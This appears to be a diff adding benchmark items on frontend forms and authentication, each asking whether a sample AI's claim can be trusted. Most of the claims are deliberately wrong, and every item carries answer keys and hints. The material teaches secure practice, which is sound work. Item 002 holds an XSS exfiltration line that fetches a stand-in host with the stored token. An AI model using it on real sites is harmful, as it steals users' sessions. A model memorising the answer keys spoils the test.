@@ -1,0 +1,474 @@
+[
+  {
+    "id": "fe-forms-authentication-001",
+    "subject": "frontend",
+    "topic": "Forms & Authentication",
+    "subtopic": "Client-side validation is not enforcement",
+    "difficulty": "2",
+    "challenge_mode": "trust_or_challenge",
+    "question": "Because of required and minlength, can the server safely assume every signup request has an email and a password of at least 8 characters?",
+    "artifact_type": "markup",
+    "artifact": {
+      "language": "html",
+      "markup": "<form action=\"/api/signup\" method=\"post\">\n  <input type=\"email\" name=\"email\" required>\n  <input type=\"password\" name=\"password\" required minlength=\"8\">\n  <button>Sign up</button>\n</form>"
+    },
+    "ai_claim": "Yes. The browser blocks submission until both fields are valid, so every request the server receives meets these rules.",
+    "ai_solution": [
+      {
+        "index": 1,
+        "text": "required prevents submitting an empty field."
+      },
+      {
+        "index": 2,
+        "text": "minlength='8' blocks shorter passwords."
+      },
+      {
+        "index": 3,
+        "text": "The form can only be submitted when both rules pass."
+      },
+      {
+        "index": 4,
+        "text": "So the server can trust every request."
+      }
+    ],
+    "ai_final_answer": "yes",
+    "simulated_confidence": 95,
+    "truth_state": "flawed",
+    "failure": {
+      "category": "F16",
+      "location": 4,
+      "misconception": "Relying on the browser to enforce server rules",
+      "explanation": "HTML validation runs only in cooperating browsers submitting this form. Anyone can send a POST to /api/signup with curl, a script or edited DevTools markup, with any values. Client-side validation is a usability feature; the server must validate every request itself.",
+      "why_convincing": "In normal use the form really does block invalid input."
+    },
+    "missing_information": "",
+    "resolving_scenarios": [],
+    "answer_coincidentally_correct": false,
+    "canonical_solution": "No: requests can bypass the browser entirely. Validate email and password length on the server as well.",
+    "canonical_answer": "no",
+    "valid_evidence": [
+      {
+        "type": "counterexample",
+        "summary": "curl -X POST /api/signup -d 'email=&password=1' reaches the server without any browser checks.",
+        "must_reference_step": 4,
+        "must_contain_values": []
+      },
+      {
+        "type": "rule",
+        "summary": "Client-side validation improves UX but provides no security guarantee; the server must validate input.",
+        "must_reference_step": 4,
+        "must_contain_values": []
+      }
+    ],
+    "counterexamples": [
+      "A request sent with curl has no email at all."
+    ],
+    "hints": [
+      {
+        "level": 1,
+        "kind": "attention",
+        "text": "Think of ways to send a request without using this form."
+      },
+      {
+        "level": 2,
+        "kind": "direction",
+        "text": "Step 4 extends the browser's checks to all requests."
+      },
+      {
+        "level": 3,
+        "kind": "concept",
+        "text": "The server receives HTTP requests, not forms; anything can send them."
+      },
+      {
+        "level": 4,
+        "kind": "strong",
+        "text": "Send the signup request with curl."
+      },
+      {
+        "level": 5,
+        "kind": "reveal",
+        "text": "Step 4 is wrong: requests can bypass the browser. Validate on the server too."
+      }
+    ],
+    "repair": "Keep the HTML validation for UX and add server-side validation of every field.",
+    "debrief": "Frontend validation is for users; backend validation is for correctness and security. Every rule that matters must be enforced where the data is accepted.",
+    "transfer_check": null,
+    "validation_payload": {}
+  },
+  {
+    "id": "fe-forms-authentication-002",
+    "subject": "frontend",
+    "topic": "Forms & Authentication",
+    "subtopic": "Where to keep the token",
+    "difficulty": "3",
+    "challenge_mode": "trust_or_challenge",
+    "question": "Is the token safe from theft here, since other websites cannot read this site's localStorage?",
+    "artifact_type": "code",
+    "artifact": {
+      "language": "javascript",
+      "code": "// after login\nlocalStorage.setItem(\"token\", data.accessToken);\n\n// on every request\nfetch(\"/api/orders\", {\n  headers: { Authorization: `Bearer ${localStorage.getItem(\"token\")}` }\n});"
+    },
+    "ai_claim": "Yes. localStorage is isolated per origin, so no other site can read the token, which makes it a safe place to keep it.",
+    "ai_solution": [
+      {
+        "index": 1,
+        "text": "localStorage is scoped to the site's origin."
+      },
+      {
+        "index": 2,
+        "text": "Scripts from other origins cannot read it."
+      },
+      {
+        "index": 3,
+        "text": "Only this site's own code can access the token."
+      },
+      {
+        "index": 4,
+        "text": "So the token cannot be stolen."
+      }
+    ],
+    "ai_final_answer": "yes",
+    "simulated_confidence": 88,
+    "truth_state": "flawed",
+    "failure": {
+      "category": "F06",
+      "location": 3,
+      "misconception": "Treating 'this site's code' as only trusted code",
+      "explanation": "Origin isolation stops other sites, but any script running on this page - including injected script from an XSS bug or a compromised third-party library - is 'this site's code' and can read localStorage and send the token anywhere. An httpOnly cookie cannot be read by JavaScript at all, which removes that theft path.",
+      "why_convincing": "Steps 1 and 2 are true, and origin isolation is a real security boundary."
+    },
+    "missing_information": "",
+    "resolving_scenarios": [],
+    "answer_coincidentally_correct": false,
+    "canonical_solution": "Not safe from XSS: any script on the page can read localStorage. Prefer an httpOnly, Secure, SameSite cookie for the session token.",
+    "canonical_answer": "no",
+    "valid_evidence": [
+      {
+        "type": "counterexample",
+        "summary": "An injected script runs fetch('https://evil.example/?t=' + localStorage.getItem('token')).",
+        "must_reference_step": 3,
+        "must_contain_values": []
+      },
+      {
+        "type": "rewrite",
+        "summary": "Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax",
+        "must_reference_step": 3,
+        "must_contain_values": []
+      }
+    ],
+    "counterexamples": [
+      "An XSS payload or malicious npm package can read the token."
+    ],
+    "hints": [
+      {
+        "level": 1,
+        "kind": "attention",
+        "text": "Consider scripts that run on this origin but are not yours."
+      },
+      {
+        "level": 2,
+        "kind": "direction",
+        "text": "Step 3 assumes only trusted code runs on the page."
+      },
+      {
+        "level": 3,
+        "kind": "concept",
+        "text": "XSS and third-party scripts execute with the page's origin and can read localStorage."
+      },
+      {
+        "level": 4,
+        "kind": "strong",
+        "text": "Ask what an injected script could do with localStorage.getItem('token')."
+      },
+      {
+        "level": 5,
+        "kind": "reveal",
+        "text": "Step 3 is wrong: any script on the page, including injected ones, can read it. Use an httpOnly cookie."
+      }
+    ],
+    "repair": "Keep the session in an httpOnly, Secure, SameSite cookie.",
+    "debrief": "Same-origin isolation protects against other sites, not against code running inside your own page. Token storage decisions should assume an XSS bug will eventually happen.",
+    "transfer_check": null,
+    "validation_payload": {}
+  },
+  {
+    "id": "fe-forms-authentication-003",
+    "subject": "frontend",
+    "topic": "Forms & Authentication",
+    "subtopic": "Controlled inputs need onChange",
+    "difficulty": "4",
+    "challenge_mode": "trust_or_challenge",
+    "question": "Can the user edit the email in this field?",
+    "artifact_type": "component",
+    "artifact": {
+      "language": "jsx",
+      "code": "function EmailForm({ saved }) {\n  const [email, setEmail] = useState(saved.email);\n  return <input type=\"email\" value={email} />;\n}"
+    },
+    "ai_claim": "Yes. The field starts with the saved email from state, and the user can type to change it.",
+    "ai_solution": [
+      {
+        "index": 1,
+        "text": "email state is initialised with the saved email."
+      },
+      {
+        "index": 2,
+        "text": "value={email} shows it in the field."
+      },
+      {
+        "index": 3,
+        "text": "Typing updates the field's value."
+      },
+      {
+        "index": 4,
+        "text": "So the user can edit the email."
+      }
+    ],
+    "ai_final_answer": "yes",
+    "simulated_confidence": 97,
+    "truth_state": "flawed",
+    "failure": {
+      "category": "F07",
+      "location": 3,
+      "misconception": "Forgetting that value makes the input controlled",
+      "explanation": "Passing value makes the input controlled: React sets the displayed value from state on every render. Nothing updates email when the user types, so each keystroke is immediately reverted and the field behaves as read-only (React also warns about it). Add onChange={e => setEmail(e.target.value)}, or use defaultValue for an uncontrolled field.",
+      "why_convincing": "In plain HTML, a value attribute is just the initial value, and the user can type freely."
+    },
+    "missing_information": "",
+    "resolving_scenarios": [],
+    "answer_coincidentally_correct": false,
+    "canonical_solution": "No: a controlled input without onChange cannot change. Add onChange={e => setEmail(e.target.value)} or use defaultValue.",
+    "canonical_answer": "no",
+    "valid_evidence": [
+      {
+        "type": "test_case",
+        "summary": "Typing into the field has no effect; React logs 'You provided a value prop to a form field without an onChange handler'.",
+        "must_reference_step": 3,
+        "must_contain_values": []
+      },
+      {
+        "type": "rewrite",
+        "summary": "<input type=\"email\" value={email} onChange={e => setEmail(e.target.value)} />",
+        "must_reference_step": 3,
+        "must_contain_values": []
+      }
+    ],
+    "counterexamples": [
+      "Keystrokes do not change the field."
+    ],
+    "hints": [
+      {
+        "level": 1,
+        "kind": "attention",
+        "text": "Check what updates the email state."
+      },
+      {
+        "level": 2,
+        "kind": "direction",
+        "text": "Step 3 assumes typing changes the value."
+      },
+      {
+        "level": 3,
+        "kind": "concept",
+        "text": "With value set, React owns the input's value, so it only changes when state changes."
+      },
+      {
+        "level": 4,
+        "kind": "strong",
+        "text": "Type into the field."
+      },
+      {
+        "level": 5,
+        "kind": "reveal",
+        "text": "Step 3 is wrong: without onChange the state never changes, so the field is read-only. Add onChange."
+      }
+    ],
+    "repair": "Add an onChange handler (or switch to defaultValue).",
+    "debrief": "React's value prop means 'this is the value', not 'this is the starting value'. Controlled inputs need a matching state update, and forgetting it produces a field that looks editable but is not.",
+    "transfer_check": null,
+    "validation_payload": {}
+  },
+  {
+    "id": "fe-forms-authentication-004",
+    "subject": "frontend",
+    "topic": "Forms & Authentication",
+    "subtopic": "What type=email accepts",
+    "difficulty": "3",
+    "challenge_mode": "trust_or_challenge",
+    "question": "Does type=\"email\" ensure the address has a domain with a dot, such as asha@example.com, rejecting input like asha@example?",
+    "artifact_type": "markup",
+    "artifact": {
+      "language": "html",
+      "markup": "<input type=\"email\" name=\"email\" required>"
+    },
+    "ai_claim": "Yes. The browser checks the email format, including a domain with a top-level part like .com, so asha@example is rejected.",
+    "ai_solution": [
+      {
+        "index": 1,
+        "text": "type='email' enables built-in format validation."
+      },
+      {
+        "index": 2,
+        "text": "The format requires a local part, an @ and a domain."
+      },
+      {
+        "index": 3,
+        "text": "The domain must include a dot and a top-level domain."
+      },
+      {
+        "index": 4,
+        "text": "So asha@example is rejected."
+      }
+    ],
+    "ai_final_answer": "yes",
+    "simulated_confidence": 89,
+    "truth_state": "flawed",
+    "failure": {
+      "category": "F04",
+      "location": 3,
+      "misconception": "Assuming the browser's email pattern requires a top-level domain",
+      "explanation": "The HTML standard's email pattern allows a domain without a dot, so asha@example is accepted (it is valid on intranets). The check is syntactic only, and it cannot tell whether the address exists. Add a pattern if a dot is required, and verify ownership with a confirmation email.",
+      "why_convincing": "Most test addresses have a .com domain, so the missing-dot case is rarely tried."
+    },
+    "missing_information": "",
+    "resolving_scenarios": [],
+    "answer_coincidentally_correct": false,
+    "canonical_solution": "No: type=email accepts asha@example. Add pattern=\".+@.+\\..+\" if needed, and verify by sending a confirmation email.",
+    "canonical_answer": "no",
+    "valid_evidence": [
+      {
+        "type": "test_case",
+        "summary": "Enter asha@example: the field reports valid (input.checkValidity() returns true).",
+        "must_reference_step": 3,
+        "must_contain_values": []
+      },
+      {
+        "type": "rule",
+        "summary": "HTML's valid e-mail address grammar allows a single-label domain.",
+        "must_reference_step": 3,
+        "must_contain_values": []
+      }
+    ],
+    "counterexamples": [
+      "asha@example passes validation."
+    ],
+    "hints": [
+      {
+        "level": 1,
+        "kind": "attention",
+        "text": "Test an address whose domain has no dot."
+      },
+      {
+        "level": 2,
+        "kind": "direction",
+        "text": "Step 3 states a requirement the browser may not enforce."
+      },
+      {
+        "level": 3,
+        "kind": "concept",
+        "text": "The HTML email grammar permits single-label domains like 'localhost'."
+      },
+      {
+        "level": 4,
+        "kind": "strong",
+        "text": "Call checkValidity() with asha@example."
+      },
+      {
+        "level": 5,
+        "kind": "reveal",
+        "text": "Step 3 is wrong: type=email accepts asha@example. Add a pattern and verify by email."
+      }
+    ],
+    "repair": "Add a pattern for a dotted domain if required, and confirm addresses by email.",
+    "debrief": "Built-in validation checks syntax against a specific grammar, which may be looser (or stricter) than you assume. Test the edge cases you care about, and never confuse 'well-formed' with 'real'.",
+    "transfer_check": null,
+    "validation_payload": {}
+  },
+  {
+    "id": "fe-forms-authentication-005",
+    "subject": "frontend",
+    "topic": "Forms & Authentication",
+    "subtopic": "httpOnly session cookies",
+    "difficulty": "5",
+    "challenge_mode": "trust_or_challenge",
+    "question": "Is the AI's assessment of this setup accurate?",
+    "artifact_type": "code",
+    "artifact": {
+      "language": "javascript",
+      "code": "// server response after login\nSet-Cookie: session=8f2c...; HttpOnly; Secure; SameSite=Lax; Path=/\n\n// frontend requests\nfetch(\"/api/orders\", { credentials: \"same-origin\" });"
+    },
+    "ai_claim": "Mostly protective: scripts cannot read an HttpOnly cookie, so an XSS bug cannot steal the session, and SameSite=Lax blocks most cross-site request forgery. An XSS script can still make requests as the user while the page is open.",
+    "ai_solution": [
+      {
+        "index": 1,
+        "text": "HttpOnly hides the cookie from document.cookie and all page scripts."
+      },
+      {
+        "index": 2,
+        "text": "The browser still attaches it to same-origin requests automatically."
+      },
+      {
+        "index": 3,
+        "text": "SameSite=Lax stops the cookie being sent on cross-site POSTs and subresource requests."
+      },
+      {
+        "index": 4,
+        "text": "XSS cannot exfiltrate the cookie, but injected code can still call the API from the page."
+      }
+    ],
+    "ai_final_answer": "yes",
+    "simulated_confidence": 97,
+    "truth_state": "valid",
+    "failure": null,
+    "missing_information": "",
+    "resolving_scenarios": [],
+    "answer_coincidentally_correct": false,
+    "canonical_solution": "Correct, including the limitation. HttpOnly prevents token theft, Secure restricts it to HTTPS, and SameSite=Lax mitigates CSRF. XSS remains dangerous because it can act as the user in the page, so it must still be prevented.",
+    "canonical_answer": "yes",
+    "valid_evidence": [
+      {
+        "type": "rule",
+        "summary": "Cookies with the HttpOnly attribute are not exposed to document.cookie.",
+        "must_reference_step": 1,
+        "must_contain_values": []
+      },
+      {
+        "type": "counterexample",
+        "summary": "An injected script calling fetch('/api/orders', { method: 'DELETE' }) is sent with the cookie.",
+        "must_reference_step": 4,
+        "must_contain_values": []
+      }
+    ],
+    "counterexamples": [],
+    "hints": [
+      {
+        "level": 1,
+        "kind": "attention",
+        "text": "Separate reading the cookie from using it."
+      },
+      {
+        "level": 2,
+        "kind": "direction",
+        "text": "Step 4 states what XSS can and cannot do here."
+      },
+      {
+        "level": 3,
+        "kind": "concept",
+        "text": "HttpOnly hides the cookie from scripts; the browser still sends it with requests."
+      },
+      {
+        "level": 4,
+        "kind": "strong",
+        "text": "Try document.cookie in the console, then a fetch to the API."
+      },
+      {
+        "level": 5,
+        "kind": "reveal",
+        "text": "This solution is correct. The cookie cannot be stolen by scripts, CSRF is mitigated, and the XSS limitation is stated accurately. The right judgment was to approve it."
+      }
+    ],
+    "repair": "",
+    "debrief": "Good security claims state their limits. HttpOnly cookies remove token theft but not in-page abuse, so the claim is accurate precisely because it does not overstate the protection.",
+    "transfer_check": null,
+    "validation_payload": {}
+  }
+]
